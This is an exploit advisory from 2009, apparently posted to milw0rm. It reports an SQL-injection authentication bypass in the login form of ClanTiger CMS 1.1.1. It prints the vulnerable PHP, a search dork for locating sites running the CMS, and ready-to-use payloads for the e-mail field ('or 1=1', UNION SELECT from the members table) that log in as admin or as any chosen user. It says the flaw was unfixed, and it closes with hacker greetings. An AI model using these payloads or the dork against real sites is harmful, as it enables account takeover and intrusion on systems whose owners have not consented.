@@ -1,0 +1,134 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	    	AUTH BYPASS LOGIN FORM (SQL INJECTION)	         	     |
+|--------------------------------------------------------------------------------------------|
+|                         	     | CLAN TIGER CMS |		 			     |
+|  CMS INFORMATION:		      ----------------					     |
+|										             |
+|-->WEB: http://www.clantiger.com				   		             |
+|-->DOWNLOAD: http://www.clantiger.com/download-clan-cms 	   		             |
+|-->DEMO: http://www.demo.clantiger.com/						     |
+|-->CATEGORY: CMS / Portals								     |
+|-->DESCRIPTION: ClanTiger is a content management system specifically designed for gaiming  |
+| 		clans...								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 2.0.0.20 and IE 7.0.5730 (Default)				     |
+|-->DORK: "Powered by ClanTiger"							     |
+|-->CATEGORY: SQL INJECTION/ AUTH BYPASS						     |
+|-->AFFECT VERSION: LAST = 1.1.1 (1.1 too)						     |
+|-->Discovered Bug date: 2009-04-11							     |
+|-->Reported Bug date: 2009-04-11							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch (????): Not fixed							     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+----------------------------------------------------------------------------------------------
+
+-----------
+BUG FILE:
+-----------
+
+Path --> [HOME_PATH]/module/login.php
+
+It contents:
+
+	function authenticate()
+	{
+		
+		$authentication = $this->access->authenticate($_POST['email'],$_POST['password'],(bool) $_POST['stayLogged']);
+		if($authentication === true)
+		{
+			header('Location: index.php?info=hasLoggedIn');
+			exit;
+		}
+
+		// we couldn't log in
+		$this->errorMessages[] = $authentication;
+		$this->main();		
+		
+	}
+
+Path --> [HOME_PATH]/function/class.accesscontrol.php
+
+It contents:
+
+public function authenticate($email,$password,$stayAuthed=false)
+	{
+		
+		if($stayAuthed) $logintime = time() + (3600*24*356*3);
+		else $logintime = time() + 3600;
+		
+		// attempt to get the user from the database
+		include ROOTPATH . 'base/class.user.php';
+		$user = new User;
+		$user->email = $email;
+		$user->password = md5($password);
+		$user->getBy(array('email','password'));
+		...
+				
+	}	
+
+------------
+CONDITIONS:
+------------
+
+**gpc_magic_quotes=off
+
+----------------------------------
+PROOF OF CONCEPT (SQL INJECTION):
+----------------------------------
+
+[HOME_PATH]/index.php?module=login
+
+login form:
+
+e-mail value: something' [SQL]
+password value: something //it is not used
+
+---------
+EXAMPLE:
+---------
+
+login post form:
+
+e-mail value: something' or 1=1 /* --> we are admin!
+e-mail value: something' or 1   #  --> we are admin!
+
+Note: Now, we need DB_PREFIX (default: "", others: db_, clan_, etc)
+
+e-mail value: something' AND 0 UNION ALL SELECT * FROM members WHERE id=1 /*-->admin (if id=1)!
+e-mail value: something' AND 0 UNION ALL SELECT * FROM members WHERE id=12 /* -->we are user id=12! 
+
+*******************************************************************
+ ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+*******************************************************************
+-------------------------------------------------------------------
+*******************************************************************
+ GREETZ TO: JosS and all spanish Hack3Rs community!
+*******************************************************************
+
+-------------------EOF---------------------------------->>>ENJOY IT!
+
+# milw0rm.com [2009-04-17]
